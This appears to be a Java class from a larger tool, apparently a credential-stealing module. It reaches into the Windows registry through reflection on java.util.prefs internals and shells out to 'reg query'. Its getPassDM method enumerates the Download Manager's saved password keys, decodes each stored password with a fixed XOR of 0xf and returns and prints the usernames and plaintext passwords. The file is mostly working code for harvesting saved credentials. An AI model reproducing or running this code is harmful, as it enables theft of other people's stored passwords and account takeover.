package rt.util;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.prefs.Preferences;
import rt.interfaces.AR;

public class REG implements AR {

    private static final int HKEY_CURRENT_USER = 0x80000001;
    private static final int HKEY_LOCAL_MACHINE = 0x80000002;
    private static final int KEY_ALL_ACCESS = 0xf003f;
    private static final int KEY_WRITE = 0x20006;
    private static final int KEY_READ = 0x20019;
    private static final int REG_ACCESSDENIED = 5;
    private static final int REG_NOTFOUND = 2;
    private static final int REG_SUCCESS = 0;
    private static Method regCloseKey = null;
    private static Method regCreateKeyEx = null;
    private static Method regDeleteKey = null;
    private static Method regDeleteValue = null;
    private static Method regEnumKeyEx = null;
    private static Method regEnumValue = null;
    private static Method regOpenKey = null;
    private static Method regQueryInfoKey = null;
    private static Method regQueryValueEx = null;
    private static Method regSetValueEx = null;
    private static Preferences userRoot = Preferences.userRoot();
    private static Class<? extends Preferences> userClass = userRoot.getClass();
    private static Preferences systemRoot = Preferences.systemRoot();

    public REG() {
        try {
            regOpenKey = userClass.getDeclaredMethod("WindowsRegOpenKey", new Class[]{int.class, byte[].class, int.class});
            regOpenKey.setAccessible(true);
            regCloseKey = userClass.getDeclaredMethod("WindowsRegCloseKey", new Class[]{int.class});
            regCloseKey.setAccessible(true);
            regQueryValueEx = userClass.getDeclaredMethod("WindowsRegQueryValueEx", new Class[]{int.class, byte[].class});
            regQueryValueEx.setAccessible(true);
            regEnumValue = userClass.getDeclaredMethod("WindowsRegEnumValue", new Class[]{int.class, int.class, int.class});
            regEnumValue.setAccessible(true);
            regQueryInfoKey = userClass.getDeclaredMethod("WindowsRegQueryInfoKey1", new Class[]{int.class});
            regQueryInfoKey.setAccessible(true);
            regEnumKeyEx = userClass.getDeclaredMethod("WindowsRegEnumKeyEx", new Class[]{int.class, int.class, int.class});
            regEnumKeyEx.setAccessible(true);
            regCreateKeyEx = userClass.getDeclaredMethod("WindowsRegCreateKeyEx", new Class[]{int.class, byte[].class});
            regCreateKeyEx.setAccessible(true);
            regSetValueEx = userClass.getDeclaredMethod("WindowsRegSetValueEx", new Class[]{int.class, byte[].class, byte[].class});
            regSetValueEx.setAccessible(true);
            regDeleteValue = userClass.getDeclaredMethod("WindowsRegDeleteValue", new Class[]{int.class, byte[].class});
            regDeleteValue.setAccessible(true);
            regDeleteKey = userClass.getDeclaredMethod("WindowsRegDeleteKey", new Class[]{int.class, byte[].class});
            regDeleteKey.setAccessible(true);
        } catch (Exception e) {
        }
    }

    private String readString(int hkey, String key, String valueName)
            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
        switch (hkey) {
            case HKEY_LOCAL_MACHINE:
                return readString(systemRoot, hkey, key, valueName);
            case HKEY_CURRENT_USER:
                return readString(userRoot, hkey, key, valueName);
            default:
                throw new IllegalArgumentException("hkey=" + hkey);
        }
    }

//    private Map<String, String> readStringValues(int hkey, String key)
//            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
//        switch (hkey) {
//            case HKEY_LOCAL_MACHINE:
//                return readStringValues(systemRoot, hkey, key);
//            case HKEY_CURRENT_USER:
//                return readStringValues(userRoot, hkey, key);
//            default:
//                throw new IllegalArgumentException("hkey=" + hkey);
//        }
//    }
    private List<String> readStringSubKeys(int hkey, String key)
            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
        switch (hkey) {
            case HKEY_LOCAL_MACHINE:
                return readStringSubKeys(systemRoot, hkey, key);
            case HKEY_CURRENT_USER:
                return readStringSubKeys(userRoot, hkey, key);
            default:
                throw new IllegalArgumentException("hkey=" + hkey);
        }
    }

//    private void createKey(int hkey, String key)
//            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
//        int[] ret = null;
//        switch (hkey) {
//            case HKEY_LOCAL_MACHINE:
//                ret = createKey(systemRoot, hkey, key);
////                regCloseKey.invoke(systemRoot, new Object[]{new Integer(ret[0])});
//                regCloseKey.invoke(systemRoot, new Object[]{ret[0]});
//                break;
//            case HKEY_CURRENT_USER:
//                ret = createKey(userRoot, hkey, key);
////                regCloseKey.invoke(userRoot, new Object[]{new Integer(ret[0])});
//                regCloseKey.invoke(userRoot, new Object[]{ret[0]});
//                break;
//            default:
//                throw new IllegalArgumentException("hkey=" + hkey);
//        }
//        if (ret[1] != REG_SUCCESS) {
//            throw new IllegalArgumentException("rc=" + ret[1] + "  key=" + key);
//        }
//    }
    public void writeStringValue(int hkey, String key, String valueName, String value)
            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
        switch (hkey) {
            case HKEY_LOCAL_MACHINE:
                writeStringValue(systemRoot, hkey, key, valueName, value);
                break;
            case HKEY_CURRENT_USER:
                writeStringValue(userRoot, hkey, key, valueName, value);
                break;
            default:
                throw new IllegalArgumentException("hkey=" + hkey);
        }
    }

//    private void deleteKey(int hkey, String key)
//            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
//        int rc = -1;
//        switch (hkey) {
//            case HKEY_LOCAL_MACHINE:
//                rc = deleteKey(systemRoot, hkey, key);
//                break;
//            case HKEY_CURRENT_USER:
//                rc = deleteKey(userRoot, hkey, key);
//                break;
//            default:
//                throw new IllegalArgumentException("hkey=" + hkey);
//        }
//        if (rc != REG_SUCCESS) {
//            throw new IllegalArgumentException("rc=" + rc + "  key=" + key);
//        }
//    }
    public void deleteValue(int hkey, String key, String value)
            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
        int rc = -1;
        switch (hkey) {
            case HKEY_LOCAL_MACHINE:
                rc = deleteValue(systemRoot, hkey, key, value);
                break;
            case HKEY_CURRENT_USER:
                rc = deleteValue(userRoot, hkey, key, value);
                break;
            default:
                throw new IllegalArgumentException("hkey=" + hkey);
        }
    }

    private static int deleteValue(Preferences root, int hkey, String key, String value)
            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
        int[] handles = (int[]) regOpenKey.invoke(root, new Object[]{hkey, toCstr(key), KEY_ALL_ACCESS});
        if (handles[1] != REG_SUCCESS) {
            return handles[1];
        }
        int rc = ((Integer) regDeleteValue.invoke(root, new Object[]{handles[0], toCstr(value)}));

        Object invoke = regCloseKey.invoke(root, new Object[]{handles[0]});
        return rc;
    }

//    private static int deleteKey(Preferences root, int hkey, String key)
//            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
//        int rc = ((Integer) regDeleteKey.invoke(root, new Object[]{hkey, toCstr(key)}));
//        return rc;
//    }
    private static String readString(Preferences root, int hkey, String key, String value)
            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
        int[] handles = (int[]) regOpenKey.invoke(root, new Object[]{hkey, toCstr(key), KEY_READ});
        if (handles[1] != REG_SUCCESS) {
            return null;
        }

        byte[] valb = (byte[]) regQueryValueEx.invoke(root, new Object[]{handles[0], toCstr(value)});
        regCloseKey.invoke(root, new Object[]{handles[0]});
        return ((valb != null) ? new String(valb).trim() : null);
    }

//    private Map<String, String> readStringValues(Preferences root, int hkey, String key)
//            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
//        HashMap<String, String> results = new HashMap<String, String>();
//
//        int[] handles = (int[]) regOpenKey.invoke(root, new Object[]{hkey, toCstr(key), KEY_READ});
//        if (handles[1] != REG_SUCCESS) {
//            return null;
//        }
//
//        int[] info = (int[]) regQueryInfoKey.invoke(root, new Object[]{handles[0]});
//        int count = info[2];    // count
//        int maxlen = info[4];
//        for (int ii : info) {
//            System.out.println(ii);
//        }
//        for (int index = 0; index < count; index++) {
//
//            byte[] name = (byte[]) regEnumValue.invoke(root, new Object[]{handles[0], index, maxlen + 1});
//            String value = readString(hkey, key, new String(name));
//            results.put(new String(name).trim(), value);
//        }
//        regCloseKey.invoke(root, new Object[]{handles[0]});
//        return results;
//    }
    private List<String> readStringSubKeys(Preferences root, int hkey, String key)
            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
        List<String> results = new ArrayList<String>();
        int[] handles = (int[]) regOpenKey.invoke(root, new Object[]{hkey, toCstr(key), KEY_READ});
        if (handles[1] != REG_SUCCESS) {
            return null;
        }
        int[] info = (int[]) regQueryInfoKey.invoke(root, new Object[]{handles[0]});
        for (int ii : info) {
            System.out.println(ii);
        }
        int count = info[0];    // count
        int maxlen = info[3];    // value length max
        for (int index = 0; index < count; index++) {
            byte[] name = (byte[]) regEnumKeyEx.invoke(root, new Object[]{handles[0], index, maxlen + 1});
            results.add(new String(name).trim());
        }
        regCloseKey.invoke(root, new Object[]{handles[0]});
        return results;
    }

//    private static int[] createKey(Preferences root, int hkey, String key)
//            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
//        return (int[]) regCreateKeyEx.invoke(root, new Object[]{hkey, toCstr(key)});
//    }
    private static void writeStringValue(Preferences root, int hkey, String key, String valueName, String value)
            throws IllegalArgumentException, IllegalAccessException, InvocationTargetException {
        int[] handles = (int[]) regOpenKey.invoke(root, new Object[]{hkey, toCstr(key), KEY_WRITE});
        if (handles[1] != REG_SUCCESS) {
            throw new IllegalArgumentException("rc=" + handles[1] + "  key=" + key + "  value=" + value);
        }
        regSetValueEx.invoke(root, new Object[]{handles[0], toCstr(valueName), toCstr(value)});
        regCloseKey.invoke(root, new Object[]{handles[0]});
    }

    // utility
    private static byte[] toCstr(String str) {
        byte[] result = new byte[str.length() + 1];
        for (int i = 0; i < str.length(); i++) {
            result[i] = (byte) str.charAt(i);
        }
        result[str.length()] = 0;
        return result;
    }

    private List<String> listaSubclaves(String t) {
        List<String> lista = new ArrayList<String>();
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"reg", "query", t});
            p.waitFor();
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
            while (br.ready()) {
                String url = br.readLine();
                if (url.isEmpty()) {
                    continue;
                }
            }
            p.destroy();
        } catch (Exception ex) {
        }
        return lista;
    }

    @Override
    public String getPassDM() {
        StringBuilder retorno = new StringBuilder();
        listaSubclaves("HKCU\\Software\\DownloadManager\\Passwords");
        try {
            List<String> l = readStringSubKeys(REG.HKEY_CURRENT_USER, "Software\\DownloadManager\\Passwords");
            String a[] = l.toArray(new String[]{});
            for (String aa : a) {
                Process p = Runtime.getRuntime().exec(new String[]{"reg", "query", "HKCU\\Software\\DownloadManager\\Passwords\\" + aa, "/v", "User"});
                System.out.println(aa);
                p.waitFor();
                BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
                br.readLine();
                br.readLine();
                String tmp = br.readLine();
                String todo[] = tmp.split("REG_NONE");
                System.out.println(todo[0].trim() + ":" + fromHexString(todo[1].trim(), 0));
                p.destroy();
                p = Runtime.getRuntime().exec(new String[]{"reg", "query", "HKCU\\Software\\DownloadManager\\Passwords\\" + aa, "/v", "EncPassword"});
                p.waitFor();
                br = new BufferedReader(new InputStreamReader(p.getInputStream(), "UTF-8"));
                br.readLine();
                br.readLine();
                tmp = br.readLine();
                todo = tmp.split("REG_NONE");
                retorno.append(todo[0].trim()).append(":").append(fromHexString(todo[1].trim(), 0xf));
                System.out.println(todo[0].trim() + ":" + fromHexString(todo[1].trim(), 0xf));
                p.destroy();
            }
        } catch (Exception ex) {
            retorno = new StringBuilder("n/a");
        }
        return retorno.toString();
    }

    private String fromHexString(String hex, int exp) {
        StringBuilder str = new StringBuilder();
        for (int i = 0; i < hex.length(); i += 2) {
            str.append((char) (Integer.parseInt(hex.substring(i, i + 2), 16) ^ exp));
        }
        return str.toString();
    }
}
